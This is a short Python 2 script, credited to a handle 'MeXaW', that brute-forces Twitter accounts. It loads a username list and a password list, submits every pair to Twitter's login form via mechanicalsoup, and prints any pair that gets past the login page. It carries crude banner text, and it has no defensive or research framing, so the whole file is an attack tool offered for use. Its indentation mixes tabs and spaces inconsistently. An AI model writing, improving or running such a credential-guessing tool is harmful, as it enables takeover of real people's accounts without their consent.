import mechanicalsoup

print("""

		Programmer By MeXaW
		@3typa - Twitter
		@Team FOx 4 :)

	""")
print("plz write username list and password list !")

username = raw_input(("User name list > "))
password = raw_input("Password List  > ")

#email
#password
username1 = open(username,"r").read().splitlines()
password1 = open(password,"r").read().splitlines()
print "Programm IS READYYYY BITCHHH !!!"
print "Will SHow the Currect Password ONLY!"
try:


    for k in username1:
	    for i in password1:


		    browser = mechanicalsoup.Browser(soup_config={"features": "html.parser"})
		    login_page = browser.get("https://twitter.com/login?lang=en")


            login_form = login_page.soup.select("form")[1]
            login_form.select("input")[0]['value'] = k #username
            login_form.select("input")[1] ['value'] = i #password
            secound_page = browser.submit(login_form,login_page.url)

            if secound_page.soup.select("title")[0].text != "Login on Twitter":
                print "[+] Password FOund ->>>>",i,"User Or email"," ",k
except Exception as p:
    print p